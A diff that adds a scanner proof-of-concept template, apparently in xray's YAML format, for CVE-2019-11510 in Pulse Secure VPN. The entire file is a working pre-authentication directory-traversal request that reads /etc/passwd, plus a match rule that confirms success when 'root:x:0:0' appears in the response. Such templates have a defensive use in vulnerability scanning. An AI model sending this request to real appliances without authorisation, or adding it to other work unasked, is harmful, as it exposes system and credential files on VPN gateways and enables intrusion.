@@ -1,0 +1,16 @@
+name: poc-pulse-secure-file-read
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd"
+    expression: response.status == 200 && response.body.bcontains("root:x:0:0")
+expression: r0()
+detail:
+  author: sxel
+  description: Pulse Secure VPN arbitrary file read probe (CVE-2019-11510, pre-auth)
+  severity: high
+  tags: pulse,vpn,traversal,leak
